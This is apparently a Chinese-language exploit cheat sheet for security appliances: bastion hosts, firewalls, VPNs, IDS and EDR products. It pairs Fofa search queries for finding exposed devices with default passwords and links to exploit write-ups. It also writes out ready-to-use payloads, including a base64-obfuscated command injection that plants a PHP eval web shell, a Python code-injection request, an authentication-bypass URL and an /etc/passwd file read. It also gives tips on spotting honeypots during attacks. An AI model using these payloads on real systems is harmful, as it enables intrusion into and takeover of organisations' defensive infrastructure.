# SecDevice - Exploits
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
## 大纲
* **身份与访问控制**
    * [堡垒机](#堡垒机)
        * [齐治堡垒机](#齐治堡垒机)
        * [H3C SecParh](#h3c-secparh)
        * [teleport堡垒机](#teleport堡垒机)
    * [IMC](#img)
        * [H3C IMC智能管理中心](#h3c-imc智能管理中心)
* **网络检测与响应**
    * [蜜罐](#蜜罐)
    * [IDS](#ids)
        * [绿盟 UTS 综合威胁探针](#绿盟-uts-综合威胁探针)
    * [防火墙](#防火墙)
        * [Cisco ASA](#cisco-asa)
        * [网康下一代防火墙](#网康下一代防火墙)
        * [启明星辰 天清汉马USG防火墙](#启明星辰-天清汉马usg防火墙)
        * [佑友防火墙](#佑友防火墙)
        * [zeroshell](#zeroshell)
        * [Sophos XG](#sophos-xg)
    * [网关](#网关)
        * [上海格尔安全认证网关管理系统](#上海格尔安全认证网关管理系统)
        * [网康 NS-ASG 安全网关](#网康-ns-asg-安全网关)
    * [负载均衡](#负载均衡)
        * [Citrix ADC](#citrix-adc)
        * [F5 BIG-IP](#f5-big-ip)
        * [天融信 Top-app LB](#天融信-top-app-lb)
    * [VPN](#vpn)
        * [Fortigate SSL VPN](#fortigate-ssl-vpn)
        * [Palo Alto SSL VPN](#palo-alto-ssl-vpn)
        * [Pulse Secure SSL VPN](#pulse-secure-ssl-vpn)
        * [深信服 VPN](#深信服-vpn)
        * [锐捷 SSL VPN](#锐捷-ssl-vpn)
    * [威胁感知](#威胁感知)
        * [Sophos UTM](#sophos-utm)
* **终端响应与检测**
    * [杀软](#杀软)
    * [EDR](#edr)
        * [深信服 EDR](#深信服-edr)
        * [360天擎](#360天擎)
        * [金山 V8 终端安全系统](#金山-v8-终端安全系统)
    * [数据防泄漏系统](#数据防泄漏系统)
        * [天融信数据防泄漏系统](#天融信数据防泄漏系统)
---
## 身份与访问控制
### 堡垒机
#### 齐治堡垒机
> Fofa: app="齐治科技-堡垒机"
**默认口令**
- shterm/shterm
**齐治堡垒机 ShtermClient-2.1.1 命令执行漏洞**
- [齐治堡垒机ShtermClient-2.1.1命令执行漏洞（CNVD-2019-09593）分析](https://www.cnblogs.com/StudyCat/p/11201725.html)
    ```
    http://10.20.10.11/listener/cluster_manage.php
    https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}- d|bash`|${IFS}|echo${IFS}
    /var/www/shterm/resources/qrcode/lbj77.php  密码10086
    ```
**CNVD-2019-20835 齐治堡垒机前台远程命令执行漏洞**
- [齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）分析](https://www.cnblogs.com/StudyCat/p/11256944.html)
**CNVD-2019-17294 齐治堡垒机后台存在命令执行漏洞**
- [齐治堡垒机后台存在命令执行漏洞（CNVD-2019-17294）分析](https://www.cnblogs.com/StudyCat/p/11197986.html)
**远程代码执行**
- POC | Payload | exp
    ```
    POST /shterm/listener/tui_update.php
    a=["t';import os;os.popen('whoami')#"]
    ```
**任意用户登录漏洞**
- POC | Payload | exp
    ```
    /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
    ```
#### H3C SecParh
> Fofa: app="H3C-SecPath-运维审计系统" && body="2018"
**get_detail_view.php 任意用户登录漏洞**
- POC | Payload | exp
    ```
    /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
    ```
#### teleport堡垒机
> fofa: app="TELEPORT堡垒机"
**相关文章**
- [teleport堡垒机审计学习](https://r0fus0d.blog.ffffffff0x.com/post/teleport_case/)
- [某开源堡垒机历史漏洞分析](https://xz.aliyun.com/t/11721)
**任意用户登录漏洞**
- POC | Payload | exp
    - [teleport 堡垒机任意用户登录漏洞](https://www.o2oxy.cn/4132.html)
    - [针对某堡垒机漏洞分析（一）](https://forum.butian.net/share/1865)
**后台文件读取**
- POC | Payload | exp
    ```
    /audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&amp;offset=0
    ```
### IMC
#### H3C IMC智能管理中心
**远程代码执行**
- [H3C IMC智能管理中心漏洞复现](https://mp.weixin.qq.com/s/Dqk1WB5ABoM5jOgq_vlnPw)
---
## 网络检测与响应
### 蜜罐
**相关文章**
- [【格物实验室】浅谈物联网蜜罐识别方法](http://blog.nsfocus.net/iot-honeypot-1111/)
- [红队遇蜜罐 莫慌](https://mp.weixin.qq.com/s/YBge1xjpjQjQ-NoK4kK6RQ)
- [浅谈Mysql蜜罐识别](https://mp.weixin.qq.com/s/f30RvhYlB97dXnjzv4_H_Q)
- [浅析开源蜜罐识别与全网测绘](https://mp.weixin.qq.com/s/ll-vIoPhBMxYVTKm3UJ8lQ)
- [蜜罐建设的一些思考](https://mp.weixin.qq.com/s/_hpJP6bTuoH-3cQtDawGOw)
**相关工具**
- [BeichenDream/WhetherMysqlSham](https://github.com/BeichenDream/WhetherMysqlSham) - 检测目标 Mysql 数据库是不是蜜罐,获取目标数据库详细信息
- [Monyer/antiHoneypot](https://github.com/Monyer/antiHoneypot) - 一个拦截蜜罐 XSSI 的 Chrome 扩展
- [NS-Sp4ce/MoAn_Honey_Pot_Urls](https://github.com/NS-Sp4ce/MoAn_Honey_Pot_Urls) - X安蜜罐用的一些存在JSonp劫持的API
**从蓝队溯源角度出发**
- 分析样本
    - PC 名称
    - 语言
    - 常用函数、方法
    - 注释习惯、变量名习惯
- 前端漏洞反制
    - 浏览器记录、书签、cookie 等
    - 验证码、手机号、邮箱
    - 攻击时间段
- 后渗透反制
    - 钓鱼文件
    - ntlm中继
    - Rogue MySql Server
**从红队角度出发**
- 前台
    - 不支持正常浏览器，仅老版 IE
    - 仅支持老版本 flash
    - 不正常的 JS 文件，js 混淆
    - 仅 json 文件, 内含指纹
    - XSS、JSONP
    - 大量网络请求
    - 同站同 CMS 不同页面不同时间、CMS 版本
    - 任意口令登录?
    - 要求实名认证、或手机号注册
- 后渗透
    - 第二次登录后发现 history 记录全部清空
    - 开放了大量端口
    - docker 容器且无正常业务数据
    - 例如 cat /proc/meminfo 这个命令无论执行多少次得到的内容都是不变的，而这真实的系统中是不可能的。
### IDS
**相关文章**
- [IDS逃避技术和对策](https://www.oschina.net/question/12_6140)
- [网络层绕过IDS/IPS的一些探索](https://security.tencent.com/index.php/blog/msg/147)
#### 绿盟 UTS 综合威胁探针
**管理员任意登录**
- POC | Payload | exp
    - [绿盟UTS综合威胁探针管理员任意登录](https://www.hedysx.com/2612.html)
    - [【干货】绿盟UTS综合威胁探针管理员任意登录](https://www.hackbug.net/archives/112.html)
---
### 防火墙
#### Cisco ASA
> fofa: app="CISCO-ASA-5520"
**CVE-2018-0296 Cisco ASA Directory Traversal**
- 相关文章
    - [CVE-2018-0296 Cisco ASA 拒绝服务漏洞分析](https://www.anquanke.com/post/id/171916)
    - [Opis błędu CVE-2018-0296 – ominięcie uwierzytelnienia w webinterfejsie Cisco ASA](https://sekurak.pl/opis-bledu-cve-2018-0296-ominiecie-uwierzytelnienia-w-webinterfejsie-cisco-asa/)
- POC | Payload | exp
    - [yassineaboukir/CVE-2018-0296](https://github.com/yassineaboukir/CVE-2018-0296)
    - [milo2012/CVE-2018-0296](https://github.com/milo2012/CVE-2018-0296)
**CVE-2020-3187 任意文件删除**